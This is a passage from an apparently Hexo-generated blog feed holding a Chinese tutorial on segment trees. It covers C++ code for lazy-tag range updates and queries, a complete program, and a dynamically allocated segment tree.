class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不完全包括，则将lazytag向下传递</span></span><br><span class="line"><span class="built_in">push_down</span>(i);</span><br><span class="line">    <span class="comment">// 并处理左右儿子中有交集的部分</span></span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span>].r &gt;= l)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">2</span> * i, l, r, k);</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].l &lt;= r)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">2</span> * i + <span class="number">1</span>, l, r, k);</span><br><span class="line">    <span class="comment">// 返回时更新上层节点</span></span><br><span class="line">tree[i].sum = tree[i * <span class="number">2</span>].sum + tree[i * <span class="number">2</span> + <span class="number">1</span>].sum;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间查询-1"><a href="#区间查询-1" class="headerlink" title="区间查询"></a>区间查询</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ll <span class="title">search</span><span class="params">(ll i, ll l, ll r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 完全包括在内，直接返回，并不用向下查询了</span></span><br><span class="line"><span class="keyword">if</span> (tree[i].l &gt;= l &amp;&amp; tree[i].r &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tree[i].sum;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 否则先向下传递自身的lazytag</span></span><br><span class="line"><span class="built_in">push_down</span>(i);</span><br><span class="line">    <span class="comment">// 然后再向左右子树查询</span></span><br><span class="line">ll num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (tree[<span class="number">2</span> * i].r &gt;= l)</span><br><span class="line">num += <span class="built_in">search</span>(<span class="number">2</span> * i, l, r);</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].l &lt;= r)</span><br><span class="line">num += <span class="built_in">search</span>(i * <span class="number">2</span> + <span class="number">1</span>, l, r);</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总代码-2"><a href="#总代码-2" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> ll N = <span class="number">1e6</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> ll mod = <span class="number">2147483647</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">ll l, r, sum;</span><br><span class="line"><span class="comment">// lazytag</span></span><br><span class="line">ll lz;</span><br><span class="line">&#125;tree[N];</span><br><span class="line"></span><br><span class="line">ll input[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线段树的构建</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(ll i, ll l, ll r, ll input[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">tree[i].lz = <span class="number">0</span>;</span><br><span class="line">tree[i].l = l;</span><br><span class="line">tree[i].r = r;</span><br><span class="line"><span class="keyword">if</span> (l == r)</span><br><span class="line">&#123;</span><br><span class="line">tree[i].sum = input[l]; <span class="comment">// 将值输入给叶子节点</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">ll mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">build</span>(<span class="number">2</span> * i, l, mid, input);</span><br><span class="line"><span class="built_in">build</span>(<span class="number">2</span> * i + <span class="number">1</span>, mid + <span class="number">1</span>, r, input);</span><br><span class="line"><span class="comment">// 最后返回时把上层节点赋值</span></span><br><span class="line">tree[i].sum = tree[<span class="number">2</span> * i].sum + tree[<span class="number">2</span> * i + <span class="number">1</span>].sum;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push_down</span><span class="params">(ll i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].lz != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">tree[i * <span class="number">2</span>].lz += tree[i].lz;</span><br><span class="line">tree[i * <span class="number">2</span> + <span class="number">1</span>].lz += tree[i].lz;</span><br><span class="line">ll mid = (tree[i].l + tree[i].r) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 这里儿子加的是父亲的lazytag，，因为本身的lazytag是使用过的，不需要再加</span></span><br><span class="line">tree[<span class="number">2</span> * i].sum += tree[i].lz * (mid - tree[i * <span class="number">2</span>].l + <span class="number">1</span>);</span><br><span class="line">tree[<span class="number">2</span> * i + <span class="number">1</span>].sum += tree[i].lz * (tree[i * <span class="number">2</span> + <span class="number">1</span>].r - mid);</span><br><span class="line">tree[i].lz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(ll i, ll l, ll r, ll k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].l &gt;= l &amp;&amp; tree[i].r &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line">tree[i].sum += k * (tree[i].r - tree[i].l + <span class="number">1</span>);</span><br><span class="line">tree[i].lz += k;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">push_down</span>(i);</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span>].r &gt;= l)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">2</span> * i, l, r, k);</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].l &lt;= r)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">2</span> * i + <span class="number">1</span>, l, r, k);</span><br><span class="line">tree[i].sum = tree[i * <span class="number">2</span>].sum + tree[i * <span class="number">2</span> + <span class="number">1</span>].sum;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">search</span><span class="params">(ll i, ll l, ll r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tree[i].l &gt;= l &amp;&amp; tree[i].r &lt;= r)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tree[i].sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">push_down</span>(i);</span><br><span class="line">ll num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (tree[<span class="number">2</span> * i].r &gt;= l)</span><br><span class="line">num += <span class="built_in">search</span>(<span class="number">2</span> * i, l, r);</span><br><span class="line"><span class="keyword">if</span> (tree[i * <span class="number">2</span> + <span class="number">1</span>].l &lt;= r)</span><br><span class="line">num += <span class="built_in">search</span>(i * <span class="number">2</span> + <span class="number">1</span>, l, r);</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ll n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; input[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n, input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line">ll a;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ll x, y, k;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y &gt;&gt; k;</span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>, x, y, k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">ll x, y;</span><br><span class="line">cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">search</span>(<span class="number">1</span>, x, y));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态开点线段树"><a href="#动态开点线段树" class="headerlink" title="动态开点线段树"></a>动态开点线段树</h2><p>[动态开点线段树 - Locked_Fog - 洛谷博客 (luogu.com.cn)](<a href="https://www.luogu.com.cn/blog/Locked-Fog/dong-tai-kai-dian-xian-duan-shu#:~:text=1%E3%80%81%E5%8A%A8%E6%80%81%E5%BC%80%E7%82%B9%E7%BA%BF%E6%AE%B5%E6%A0%91">https://www.luogu.com.cn/blog/Locked-Fog/dong-tai-kai-dian-xian-duan-shu#:~:text=1、动态开点线段树</a> 1 1、基本思路 对于线段树这种暴力结构，其空间效率是比较底下的 O (4*n) O(4∗n) 。,2、核心代码 … 3 3、例题 … 4 4、练习 )</p><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>对于线段树这种暴力结构，其空间效率是比较底下的 <em>O</em>(4∗<em>n</em>) 。因此，我们想到一个比较优秀的方法来优化——动态开点。</p><p>也就是说，其实我们不需要一上来就把所有的节点全部建立起来，只需要在用到一个节点的时候再建立一个节点就可以了。</p><blockquote><p><strong>注意</strong></p><p>使用动态开点线段树的话，节点的下标将是无序的，因此必须建立结构体或用两个数组来分别保存一个节点的左右子节点</p></blockquote><h3 id="总代码-3"><a href="#总代码-3" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line">ll val[maxn &lt;&lt; <span class="number">1</span>], lazy[maxn &lt;&lt; <span class="number">1</span>]; <span class="comment">// 涉及区间修改</span></span><br><span class="line"><span class="type">int</span> lson[maxn &lt;&lt; <span class="number">1</span>], rson[maxn &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="comment">// cnt 相当于一个编号，记录所有节点的序号</span></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span>&amp; k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">val[k] = val[lson[k]] + val[rson[k]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果lazy不为0，就推向左右儿子</span></span><br><span class="line"><span class="keyword">if</span> (lazy[k])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果左右儿子不存在就开点</span></span><br><span class="line"><span class="keyword">if</span> (!lson[k])lson[k] = ++cnt;</span><br><span class="line"><span class="keyword">if</span> (!rson[k])rson[k] = ++cnt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lazy传递给儿子</span></span><br><span class="line">lazy[lson[k]] += lazy[k];</span><br><span class="line">lazy[rson[k]] += lazy[k];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并将儿子的值加上lazy</span></span><br><span class="line"><span class="type">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">val[lson[k]] += (m - l + <span class="number">1</span>) * lazy[k];</span><br><span class="line">val[rson[k]] += (r - m) * lazy[k];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传递完清除lazy</span></span><br><span class="line">lazy[k] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用单点修改的方法建树, 递归找到目标点修改，如果目标点不存在就创建</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span>&amp; k, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> v, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// &amp;k相当于一个节点的引用，如果当前节点不存在就创建</span></span><br><span class="line"><span class="comment">// 而 v 是需要修改的节点的编号</span></span><br><span class="line"><span class="keyword">if</span> (!k)k = ++cnt;</span><br><span class="line"><span class="comment">// 叶子节点直接赋值</span></span><br><span class="line"><span class="keyword">if</span> (l == r)</span><br><span class="line">&#123;</span><br><span class="line">val[k] = x;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (v &lt;= m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">build</span>(lson[k], l, m, v, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">build</span>(rson[k], m + <span class="number">1</span>, r, v, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pushup</span>(k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间修改</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span>&amp; k, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> L, <span class="type">int</span> R, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果不存在就新建节点</span></span><br><span class="line"><span class="keyword">if</span> (!k)k = ++cnt;</span><br><span class="line"><span class="comment">// 节点被完全包括了</span></span><br><span class="line"><span class="keyword">if</span> (L &lt;= l &amp;&amp; R &gt;= r)</span><br><span class="line">&#123;</span><br><span class="line">lazy[k] += x;</span><br><span class="line">val[k] += (r - l + <span class="number">1</span>) * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">pushdown</span>(k, l, r);</span><br><span class="line"><span class="type">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (L &lt;= m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">update</span>(lson[k], l, m, L, R, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(m &lt; R)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">update</span>(rson[k], m + <span class="number">1</span>, r, L, R, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pushup</span>(k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> L, <span class="type">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!k)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R)<span class="keyword">return</span> val[k];</span><br><span class="line"><span class="built_in">pushdown</span>(k, l, r);</span><br><span class="line"><span class="type">int</span> m = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">ll ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (L &lt;= m)</span><br><span class="line">&#123;</span><br><span class="line">ans += <span class="built_in">query</span>(lson[k], l, m, L, R);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m &lt; R)</span><br><span class="line">&#123;</span><br><span class="line">ans += <span class="built_in">query</span>(rson[k], m + <span class="number">1</span>, r, L, R);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> temp = <span class="number">1</span>;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line"><span class="built_in">build</span>(temp, <span class="number">1</span>, n, i, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> q;</span><br><span class="line">cin &gt;&gt; q;</span><br><span class="line"><span class="keyword">if</span>(q == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> L, R, x;</span><br><span class="line">cin &gt;&gt; L &gt;&gt; R &gt;&gt; x;</span><br><span class="line"><span class="type">int</span> temp = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">update</span>(temp, <span class="number">1</span>, n, L, R, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> L, R;</span><br><span class="line">cin &gt;&gt; L &gt;&gt; R;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">query</span>(<span class="number">1</span>, <span class="number">1</span>, n, L, R));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;线段树&quot;&gt;&lt;a href=&quot;#线段树&quot; class=&quot;headerlink&quot; title=&quot;线段树&quot;&gt;&lt;/a&gt;线段树&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;参考文献&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
    <category term="线段树" scheme="https://1xueyu1.github.io/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
  </entry>
  
</feed>
